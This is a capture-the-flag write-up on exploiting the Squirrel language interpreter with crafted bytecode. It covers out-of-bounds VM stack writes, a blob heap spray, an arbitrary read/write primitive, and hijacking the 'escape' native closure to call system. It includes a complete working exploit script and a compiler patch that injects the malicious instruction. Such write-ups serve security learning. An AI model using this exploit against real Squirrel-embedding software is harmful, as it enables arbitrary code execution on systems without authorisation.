# Squirrel as a Service

This is quite an unusual challenge, as we don't have to exploit a custom-made piece of software, but the official runtime environment of a certain programming language, the Squirrel language. I never heard of it before; apparently it's designed for scripting in video games, but I don't know if it's actually used. The challenge is set up so that we can run Squirrel sourcecode or bytecode on the remote server, with the goal of executing arbitrary (native) code.

Squirrel programs can call into a runtime library, which actually contains functions for reading and writing files and even `system` for execution arbitrary commands, but of course those were disabled for this challenge.

Nonetheless, being able to run (some kind of) code on the target system greatly enlarges the possible attack surface. Initially I thought of attacking three main components: the compiler (transforming Squirrel sourcecode into Squirrel bytecode), the interpreter (executing Squirrel bytecode) and the runtime library (interacted with by the Squirrel bytecode). The interpreter seemed the most promising component, because it's likely not built to handle invalid bytecode correctly, and is what I ended up exploiting.

## Code Analysis

With that target in mind, let's start tracing the path our input takes through the code. We start in the `sq.c` file provided with the challenge, where our input is loaded using [`sqstd_loadfile()`](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/sqstdlib/sqstdio.cpp#L340) and then executed using [`sq_call()`](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/squirrel/sqapi.cpp#L1175). Since we want to focus on exploiting the interpreter during runtime, we follow the path of `sq_call()`. `sq_call()` directly calls [`SQVM::Call()`](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/squirrel/sqvm.cpp#L1580) and because our code is of type `OT_CLOSURE`, it in turn calls [`SQVM::Execute()`](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/squirrel/sqvm.cpp#L682). This function already contains the main instruction loop: it iterates over the instructions of the currently executed function and has a huge switch statement with one case for every valid opcode.

All instructions store an 8-bit `opcode`, three 8-bit arguments `arg0`, `arg2`, `arg3` and one 32-bit argument `arg1`, although most opcodes don't use all arguments. Since the function's instructions are loaded directly from our input, we fully control the opcode and all arguments; no additional checking is done before executing them. Looking at the first couple of opcodes, it becomes clear that no checks at all are made on the validity of the instruction's arguments. Abusing that, we can read and write out of bounds of multiple objects:

- The VM's stack: read with [`MOVE`](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/squirrel/sqvm.cpp#L834), write with [`LOADINT`](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/squirrel/sqvm.cpp#L727)

- The current function's literals: read with [`LOAD`](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/squirrel/sqvm.cpp#L726)

- The current function's instructions: execute with [`JMP`](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/squirrel/sqvm.cpp#L887)

- The current function's "outer values": dereference with [`GETOUTER`](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/squirrel/sqvm.cpp#L894) and [`SETOUTER`](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/squirrel/sqvm.cpp#L900)

- Functions referenced by the current function: read with [`CLOSURE`](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/squirrel/sqvm.cpp#L1003)

Out of these potential targets, the VM's stack seems to be the most promising: we can both read and write out of bounds without causing any additional side effect. Since the VM's stack is allocated on the heap and we can cause it to grow by having a lot of nested function calls, we can effectively `realloc` it to a larger size at will.

However, one restriction applies: the stack is an array of `SQObjectPtr`s, so we cannot read or write arbitrary values. `SQObjectPtr` is a struct containing two 64-bit members, `type` and `value`. `type` is one of a fixed set of integers, indicating the type of the object, and `value` is either the value of the object (for small types like `INTEGER`, `FLOAT`, `BOOL`) or a pointer to the actual value of the object (for larger types like `STRING`, `ARRAY`).

If we combine the out of bounds access with a heap spray, we should be able to reliably allocate a suitable corruption target immediately after the VM's stack. But which kind of object should we try and corrupt?

## Initial Corruption

A nice corruption target would be some kind of string or bytearray, storing a length and potentially even a pointer we can corrupt and freely access afterwards. Looking through the library functions available to us, we spot a type matching this exactly: `blob`. `blob`s contain bytearrays of arbitrary size and we can read from and write to them at any position.

This is the [`blob` structure](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/sqstdlib/sqstdblobimpl.h#L101):

```c
struct SQBlob {
    // pointer to virtual function table
    void *vtable;
    // current size of the blob
    uint64_t size;
    // size of the current allocation
    uint64_t allocated;
    // index at which we read or write when calling .read() or .write()
    uint64_t cur_index;
    // pointer to the contents of the blob
    unsigned char *buffer;
    // does this blob own its contents, or are they shared with other blobs?
    bool buffer_owned;
};
```

By spraying a lot of `blob`s we can exhaust the heap, so that new objects will always be allocated at the end of the heap. Then we enlarge the VM's stack to cause it to be relocated to the end of the heap. Now we can allocate another `blob` as our corruption target, which will be located immediately after the VM's stack.

After this we can corrupt the target `blob` reliably, using the VM stack out of bounds write discussed above. Since both the stack and the `blob` are aligned to 0x10 bytes, we have to corrupt two members at once, one of (`vtable`, `size`), (`allocated`, `cur_index`) and (`buffer`, `buffer_owned`). I don't want to touch the `vtable` pointer, and we don't yet know any addresses we could point `buffer` to, so corrupting `allocated` and `cur_index` is our only option here. Remember the restriction on our out of bounds write: we can only write `SQObjectPtr`s, which means that `allocated` will be overwritten with the `type` of the object we write and `cur_index` with its `value`. I chose to write a simple integer; its `type` is 0x5000002 and we completely control its `value`.

So far, so good: we now have a corrupted `blob` object with large `allocated` and controlled `cur_index`. We can use that for reading and writing data on the heap after the corrupted object, but there are still a couple of steps left until we can gain code execution. The next step will be leaking some addresses and constructing an arbitrary read and write primitive.

## Arbitrary Read and Write

To get from a powerful heap corruption to arbitrary read and write, all we have to do is allocate another `blob` object after the one we corrupted in the previous section. We can read its `buffer` to learn a heap address and its `vtable` for an address in the binary, and then overwrite `size` and `allocated` with 0x7fffffffffffffff and  `buffer` with 0x1000 (we cannot use 0x0 because there are checks for NULL) to make all of the address space available to us.

Now that we have a stable arbitrary read and write, it should be easy to get code execution.

## Code Execution

Remember the disabled `system` function in the runtime library? The function might be disabled and thus not accessible from the Squirrel VM, but its code is still present in the binary. If we overwrite one of the function objects of the runtime library, we should be able to turn it into `system`. [`escape`](http://squirrel-lang.org/squirreldoc/stdlib/stdstringlib.html#ecape) might be a good target, since it takes a single string argument just like `system`. Let's examine how those function objects are laid out in memory:

Every function provided by the runtime library is represented by an [`SQNativeClosure`](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/squirrel/sqclosure.h#L190) object. Among things like number and types of parameters, these objects also contain a native function pointer, which is invoked when we call the function from Squirrel code. For `escape`, this function pointer usually points to [`_string_escape()`](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/sqstdlib/sqstdstring.cpp#L285), at offset 0xd8c0 in the binary. The native function corresponding to `system` is [`_system_system()`](https://github.com/albertodemichelis/squirrel/blob/19442ab8a78c21db2ccd6ce79e67128747c759f8/sqstdlib/sqstdsystem.cpp#L37), at offset 0xef90 in the binary.

To substitute `system` for `escape`, all we have to know now is the address of the `SQNativeCLosure` representing `escape`. Turns out, we can easily get that by parsing `escape.tostring()`: converting any non-trivial object to a string will yield a string of the form `(type : address)`. Using that, we overwrite the function pointer of `escape` with `_system_system` and call `escape("cat flag")` to get the flag!

Flag: `CSCG{t3chnic4lly_an_0d4y_but_...}`

Just to clarify, this may be a bug in the Squirrel runtime, but its likely not considered a security issue. The documentation on the Squirrel language mentions that it's not intended to run untrusted code, ["trusted scripts only"](http://wiki.squirrel-lang.org/mainsite/Wiki/default.aspx/SquirrelWiki/FAQ.html).

Exploit code:

```c
function stack_oob_write() {
    // patched to
    //     stack[0x100-0xda-0x4+0x1] = 0xb0+0x8
    local a = 0x1337
}

// recurse a times, then call get_arb_rw_pwn()
function get_arb_rw(a) {
    if (a)
        get_arb_rw(a - 1)
    else
        get_arb_rw_pwn()
}

// blob object, allows access to whole address space
local mem = null
// vtable of blob objects, located in libsqstdlib.so
local vtable = null

// set up arbitrary read and write
function get_arb_rw_pwn() {
    local b = blob(0x30)
    mem = blob(0x30)

    // set b._allocated to 0x5000002 -> large number
    // set b._ptr to 0xb8 -> offset to mem._size
    stack_oob_write()

    // write mem._size
    b.writen(0x7fffffffffffffff, 'l')
    // write mem._allocated
    b.writen(0x7fffffffffffffff, 'l')
    // write mem._ptr
    b.writen(0, 'l')
    // write mem._buf
    b.writen(0x1000, 'l')

    // read mem.vtable
    b.seek(-0x28, 'c')
    vtable = b.readn('l')
    printf("blob vtable: 0x%x\n", vtable)

    printf("mem len: 0x%x\n", mem.len())
}

function write_ptr(addr, value) {
    mem[addr-0x1000+0] = value & 0xff
    mem[addr-0x1000+1] = (value & 0xff00) >> 8
    mem[addr-0x1000+2] = (value & 0xff0000) >> 16
    mem[addr-0x1000+3] = (value & 0xff000000) >> 24
    mem[addr-0x1000+4] = (value & 0xff00000000) >> 32
    mem[addr-0x1000+5] = (value & 0xff0000000000) >> 40
    mem[addr-0x1000+6] = (value & 0xff000000000000) >> 48
    mem[addr-0x1000+7] = (value & 0xff00000000000000) >> 56
}

// heap spray
local spray = []
for (local i = 0; i < 0x80; i++)
    spray.append(blob(0x100))

// get arb rw primitive
get_arb_rw(1000)

// _system_system from sqstdsystem.cpp
local system = vtable - 0x212a90 + 0xef90
printf("system: 0x%x\n", system)

// get nativeclosure object
print(escape + "\n")
local func = split(escape.tostring(), ":")[1].slice(5, -1).tointeger(16)
printf("func: 0x%x\n", func)

// overwrite function pointer of nativeclosure
write_ptr(func + 0x68, system)

// escape is now system, get flag
escape("cat flag")
```

Patch to the compiler, to patch the `stack_oob_write()` function:

```diff
diff --git a/squirrel/sqobject.cpp b/squirrel/sqobject.cpp
--- a/squirrel/sqobject.cpp
+++ b/squirrel/sqobject.cpp
@@ -411,6 +411,12 @@ bool SQFunctionProto::Save(SQVM *v,SQUserPointer up,SQWRITEFUNC write)
     SQInteger noutervalues = _noutervalues,nlocalvarinfos = _nlocalvarinfos;
     SQInteger nlineinfos=_nlineinfos,ninstructions = _ninstructions,nfunctions=_nfunctions;
     SQInteger ndefaultparams = _ndefaultparams;
+
+    if (!strcmp("stack_oob_write", _name._unVal.pString->_val)) {
+        printf("patching stack_oob_write\n");
+        _instructions[0] = SQInstruction(_OP_LOADINT, 0x23, 0xb8);
+    }
+
     _CHECK_IO(WriteTag(v,write,up,SQ_CLOSURESTREAM_PART));
     _CHECK_IO(WriteObject(v,up,write,_sourcename));
     _CHECK_IO(WriteObject(v,up,write,_name));
```
